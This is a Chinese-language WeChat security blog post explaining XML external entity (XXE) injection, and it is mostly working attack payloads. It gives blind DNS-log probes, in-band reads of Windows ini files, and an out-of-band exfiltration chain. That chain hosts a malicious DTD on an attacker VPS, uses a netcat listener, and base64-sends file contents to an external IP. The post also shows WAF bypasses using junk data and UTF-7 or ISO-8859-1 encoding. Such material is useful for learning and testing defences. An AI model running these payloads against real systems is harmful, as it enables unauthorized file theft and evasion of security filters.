---
title: 《XXE xa0introduce/simple bypass 实战图文》
url: https://mp.weixin.qq.com/s/PbXCkQ80nAlyxj6JUtIBxw
source: Doonsec's feed
date: 2026-01-11
fetch_date: 2026-01-12T03:37:05.008347
---

# 《XXE xa0introduce/simple bypass 实战图文》

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicAuvQAjlbT9iaAOHTJg1AJibTKWv3muLKbqWicG01sv1JteSSN84wT4Mxg/0?wx_fmt=jpeg)

# 《XXE  introduce/simple bypass 实战图文》

原创

Lior1969

Moonlight安全

![]()

在小说阅读器中沉浸阅读

**由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！所有工具安全性自测！！！**

**VX：dawn19691029**

**汇报人：Lior1969**

**时间：2026.01.11**

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicx7oTqyvfwDdk4Eicd2YBhaAIRdh5I0XQ4fR15HHUn2B8btk3Qh4wo3w/640?wx_fmt=png&from=appmsg)

《XXE  introduce/simple bypass 实战图文》

**01**

前言

*汇总+思考的xxe内容，有国内师傅和国外的文章翻译的部分因为过于久远了也忘记了来自哪里*

**Moonlight**

**02**

介绍

XXE主要由DTD文档构成，因此先介绍DTD，如下所示红色部分为DTD

1、开头必须声明为XML <?xml version=”1.0”?>
2、第二行为<!DOCTYPE 根元素 [元素声明]>

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicIT5ibQvuoCDxO8zgZtgaVyjNAuVWeJY3mbemMeyVFicxVbDOWichn50Yw/640?wx_fmt=png&from=appmsg)

```
例如 <!DOCTYPE NOTE    //声明此文档为NOTE类型     <!DOCTYPE ANY     //也可以为ANY        <!DOCTYPE ROOT        //ROOT之类
```

3、DTD有内外引用两种方式

1)内部的 DOCTYPE 声明

<!DOCTYPE 根元素 [元素声明]>

2)外部文档声明

<!DOCTYPE 根元素 SYSTEM ”文件名”> PUBLIC也是可以的，和SYSTEM一样

DTD的实体声明有三种方式

（1）内部实体声明

<!ENTITY 实体名称 “实体的值”>

例如：<!ELEMENT note (message+)>

（2）外部实体声明

<!ENTITY 实体名称 SYSTEM “URI”>

例如：

<!ENTITY foo SYSTEM “file:///etc/passwd”>

（3）参数实体声明

<!ENTITY %实体名称 ”实体的值”>或者<!ENTITY %实体名称 SYSTEM ”URI”>

例如：<!ENTITY %remote SYSTEM “http://119.23.14.70:8080/xxe.xml”>

**Moonlight**

**03**

XXE payload

基础的XXEpyaload

```
burp搜索XML看是否存在相关XML字段或自己修改content-type为 application/xml   Content-type: text/xml
```

1、盲探测

向某个网站的某个端口发送一条请求，成功建立的请求持续时间会特别长

```
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE ANY[    <!ENTITY Quan SYSTEM "http://6w3pkd.dnslog.cn">]><root>&Quan;</root>
```

基础的XXEpyaload

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicOw0rianzApC5h18y0UsLoM4XIYSpLlYK1yJO1F9x3NSlbe2LzMUrSnA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdiclcnicY3d52LJhFhIK7GQ8fJTqAaYxbf3RfMZicxj0UKJvduvkw85XDvw/640?wx_fmt=png&from=appmsg)

2、有回显的读取文件

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[    <!ENTITY file PUBLIC "data""file:///c:/windows/win.ini">    ]><user><username>&file;</username><password>xxxx</password></user>
```

注意看，此处有回显是因为把&file;引入到了username的地方，而username原本的地方就是有回显的。

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicUvMZhUxBhicY9DJvx32B2n5z8nq87vC7ibACw5ITDFk5DUibcnLnR1kFw/640?wx_fmt=png&from=appmsg)

3、无回显的读取文件

1、在VPS上创建文件xxe.dtd 内容为如下

```
<?xml version="1.0" encoding="UTF-8"?><!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/system.ini"><!ENTITY % int"<!ENTITY &#37; send SYSTEM 'http://xx.156.10.245:22222?p=%file;'>">
```

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicq0a0roQHhYM4rksIRZoUmocCdzbvh97fahWFYVBxtsxqZ8bC5q7t5w/640?wx_fmt=png&from=appmsg)

2、开启端口python -m SimpleHTTPServer 11111
3、开启nc -lvvp 22222
4、在存在XXE漏洞的网站输入payload
5、发送post包如下

```
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://xx.156.10.245:11111/xxe.dtd">%remote;%int;%send;]>
```

发送可以成功读取ini文件

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicVgt3vWIhs0ZRJFQay1GJHPkZhuk9BAv1ozKVbpJeXrlxodHA0icXrXg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicddjgVubDiafqyzw4qhuY87dYAFhcPD4RvEfnSeUzEjNHA14ibvPIkoMg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdic3ZX4co99Wv7afJOzGxyeU6iaryXOTt7RON75cFgZOQju3PAsSSrERGw/640?wx_fmt=png&from=appmsg)

bypass

开启一个环境，使用payload测试，只要能解析即可达到目的，这里的环境就不多说了，随意的XXE靶场即可

这是没有经过混淆的，success

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicNfBjOVu4pSmPFmoibWBy5wlzGrhocIcWkQZvWzs71mOjXLfNV9TnYFQ/640?wx_fmt=png&from=appmsg)

发送可以成功读取ini

垃圾数据bypasswaf

文件

```
<?xml version="1.0" encoding="utf-8" xxxxxxxxxxxxxxxxxx a="adasdasddddddddddddddddddddddddddsxxxxxxxxdddddddddddddddddddddddddddddddddddd"
asdasdasdasd
?><!DOCTYPE note[    <!ENTITY ssrf SYSTEM "http://81.68.xx.xx:1234/lajishuju222">]><reset>&ssrf;</reset>
```

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicuPG23wbOyynPg5V16Vic7zyFqVU3pvNAVJervmsnI4icjhup0yWK8AsQ/640?wx_fmt=png&from=appmsg)

字符编码绕过

iconv命令可以将一种已知的字符集文件转换成另一种已知的字符集文件
UTF7
<?xml version=”1.0” encoding=”utf-7”?>
直接转换修改8为7，内容不用做任何改变

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdicfHJ5VAR3MBHb8Z4oUm2hUkNDM4ibRp8MViaCjDWP20wAhbgU6gblgq6A/640?wx_fmt=png&from=appmsg)

utf-7

```
<?xml version="1.0" encoding="utf-7"?>+ADwAIQ-DOCTYPE note+AFs    +ADwAIQ-ENTITY ssrf SYSTEM +ACI-http://81.68.xx.xx:1234/utf777+ACIAPg+AF0APg+ADw-reset+AD4+ACY-ssrf+ADs+ADw-/reset+AD4+ADw-a+AD4+ADw-foo+AD4-foo1 foo2+ADw-/foo+AD4APA-foofoo/+AD4+ADw-/a+AD4
```

发送可以成功读取ini文件

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdic9w5NlsUR3g0Kic9Gg7RibpFvHNtqWD5pjSLN9vOGGtAgM9ErQxibQR7icQ/640?wx_fmt=png&from=appmsg)

ISO-8859-1
<?xml version=”1.0” encoding=”ISO-8859-1”?>
直接修改encoding也能解析

![](https://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5gfveK3OGu4LGdgkNhwPEdichpiaWtJWlZiaXVT5Kw2ZaMbHc7QsgUXIMY6b45Xh7ZcSvrUcL5OPqqNA/640?wx_fmt=png&from=appmsg)

**Moonlight**

**说明**

**欢迎师傅加我微信，分享国家护网/攻防演练漏洞poc/Src挖掘 交流**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5jOEtrL6tj26a9ALCsb485iaxPGtEBmk3QfHB3OJnRryNpUloSzrpCyOVO0S4AvCgxLZ1fZ3aVDZYw/0?wx_fmt=png)

Moonlight安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/icm3TqwJIic5jOEtrL6tj26a9ALCsb485iaxPGtEBmk3QfHB3OJnRryNpUloSzrpCyOVO0S4AvCgxLZ1fZ3aVDZYw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过